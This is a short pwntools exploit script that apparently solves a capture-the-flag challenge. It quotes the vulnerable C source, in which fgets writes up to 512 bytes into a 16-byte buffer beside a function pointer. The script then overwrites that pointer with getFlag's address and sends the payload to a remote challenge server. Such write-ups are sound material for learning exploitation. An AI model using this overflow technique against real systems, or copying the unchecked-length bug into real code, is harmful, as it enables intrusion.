from pwn import *

"""#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

void getFlag(){
	printf("Congrats! you can get the flag\n");
	fflush(stdout);
	system("cat flag");
}

int main(int argc, char **argv){
	struct {
		char buffer[16];
		volatile int (*funcPointer)();
	} stores;
	
	stores.funcPointer = NULL;
	printf("Try to get flag by inputing argument\n");
	fflush(stdout);
	assert(fgets(stores.buffer, 512, stdin) != NULL);
	if(stores.funcPointer){
		printf("Function is goint to %p\n", stores.funcPointer);
		fflush(stdout);
		stores.funcPointer();
	}
	else{
		printf("oh no, please try again!\n");
	}
	return 0;"""
	
# Buffer overflow.
# Using gdb I found the address of getFlag() to be 4011f6. This address needed to be stored in funcPointer.
# 16 A's were enough to overflow the buffer, and then I add the payload

payload = p64(0x4011f6)
print(payload)

r = remote('server address', 7001)
r.recvline()
r.sendline(b'A'*16 + payload)


print(r.recvall())
